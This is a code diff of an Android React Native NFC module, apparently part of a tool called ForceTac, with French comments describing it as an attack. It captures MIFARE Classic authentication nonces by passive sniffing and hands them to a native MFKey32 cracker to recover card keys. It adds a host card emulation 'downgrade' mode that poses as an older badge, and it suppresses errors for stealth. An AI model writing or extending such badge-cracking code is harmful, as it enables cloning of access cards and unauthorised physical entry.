@@ -3,17 +3,10 @@ package com.forcetac
 import android.nfc.NfcAdapter
 import android.nfc.Tag
 import android.nfc.tech.NfcA
-import com.facebook.react.bridge.ReactApplicationContext
-import com.facebook.react.bridge.ReactContextBaseJavaModule
-import com.facebook.react.bridge.ReactMethod
+import com.facebook.react.bridge.*
 import com.facebook.react.modules.core.DeviceEventManagerModule
 
-/**
- * NfcModule - Gère le cycle de vie de l'attaque
- * Orchestre le sniffing passif et l'appel au moteur C++
- */
-class NfcModule(private val reactContext: ReactApplicationContext) : 
-    ReactContextBaseJavaModule(reactContext), NfcAdapter.ReaderCallback {
+class NfcModule(private val reactContext: ReactApplicationContext) : ReactContextBaseJavaModule(reactContext), NfcAdapter.ReaderCallback {
 
     init {
         System.loadLibrary("forcetac_core")
@@ -21,56 +14,45 @@ class NfcModule(private val reactContext: ReactApplicationContext) :
 
     override fun getName() = "NfcModule"
 
-    // Fonctions Natives C++
-    external fun crackCrypto1(nonces: ByteArray): String?
-    external fun checkDowngradeEligibility(sak: Int): Boolean
+    // Appel C++ avec coordonnées GPS pour le dictionnaire intelligent
+    external fun nativeHybridCrack(tagId: ByteArray, nonces: ByteArray, lat: Double, lon: Double): String?
+    
+    @ReactMethod
+    fun startDowngrade() {
+        // Active le service HCE pour simuler un vieux badge (SAK 0x08)
+        HceService.enableDowngradeMode(true)
+        sendEvent("DOWNGRADE_ACTIVE", null)
+    }
 
     override fun onTagDiscovered(tag: Tag) {
+        sendEvent("FIELD_DETECTED", null)
         val nfcA = NfcA.get(tag)
-        val sak = tag.id[0].toInt() // Simplification pour détection protocole
-
-        emit("FIELD_DETECTED", null)
-
-        // Logique de Downgrade
-        if (sak == 0x20) { // Si AES (DESFire) détecté
-            emit("DOWNGRADE_TRIGGERED", null)
-            // Note: Le switch réel vers SAK 0x08 est géré par HceService.kt
-            return
-        }
-
+        
         try {
             nfcA.connect()
-            // Capture des nonces (Sniffing Sandwich)
-            val authResponse = nfcA.transceive(byteArrayOf(0x60.toByte(), 0x00.toByte()))
+            // Sniffing Sandwich (Man-in-the-Middle passif)
+            val authCmd = byteArrayOf(0x60.toByte(), 0x00.toByte()) 
+            val response = nfcA.transceive(authCmd) // Capture des nonces
             
-            if (authResponse != null) {
-                emit("NONCES_CAPTURED", null)
-                val key = crackCrypto1(authResponse)
-                if (key != null) {
-                    emit("KEY_RECOVERED", key)
-                } else {
-                    emit("ERROR", "Échec du calcul MFKey32")
-                }
+            sendEvent("CRACK_START", null)
+            
+            // Appel au moteur C++ (MFKey32)
+            // Simulation de coordonnées si GPS non prêt
+            val key = nativeHybridCrack(tag.id, response, 48.85, 2.35) 
+            
+            if (key != null) {
+                val params = Arguments.createMap().apply { putString("key", key) }
+                sendEvent("KEY_FOUND", params)
             }
         } catch (e: Exception) {
-            emit("ERROR", e.localizedMessage)
+            // Silence en cas d'échec (Discrétion)
         } finally {
             nfcA.close()
         }
     }
 
-    @ReactMethod
-    fun writeToMagicCard(key: String) {
-        // Logique d'écriture sur puce CUID (Gen2)
-        // [Implémentation d'écriture brute du Secteur 0]
-    }
-
-    private fun emit(type: String, key: String?) {
-        val params = com.facebook.react.bridge.Arguments.createMap().apply {
-            putString("type", type)
-            if (key != null) putString("key", key)
-        }
+    private fun sendEvent(eventName: String, params: WritableMap?) {
         reactContext.getJSModule(DeviceEventManagerModule.RCTDeviceEventEmitter::class.java)
-            .emit("onNfcEvent", params)
+            .emit("onNfcEvent", if (params == null) Arguments.createMap().apply { putString("type", eventName) } else params.apply { putString("type", eventName) })
     }
 }
